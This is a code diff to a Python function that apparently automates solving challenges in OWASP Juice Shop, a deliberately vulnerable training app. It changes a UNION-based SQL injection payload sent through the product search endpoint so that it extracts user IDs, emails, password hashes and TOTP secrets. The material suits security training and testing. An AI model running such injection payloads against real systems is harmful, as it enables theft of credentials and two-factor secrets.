@@ -25,8 +25,8 @@ def get_users_with_sql_injection(server):
     :param server: juice shop URL
     """
     session = get_admin_session(server)
-    injection = "test')) UNION SELECT NULL,email,password,NULL,NULL,NULL,NULL,NULL FROM USERS--"
-    users = session.get('{}/rest/product/search?q={}'.format(server, injection))
+    injection = "test')) UNION SELECT NULL,ID,email,password,totpsecret,NULL,NULL,NULL,NULL FROM users--"
+    users = session.get('{}/rest/products/search?q={}'.format(server, injection))
     if not users.ok:
         raise RuntimeError('Error with SQLi attempt.')
     print('Found email and password hashes with SQLi, printing...')
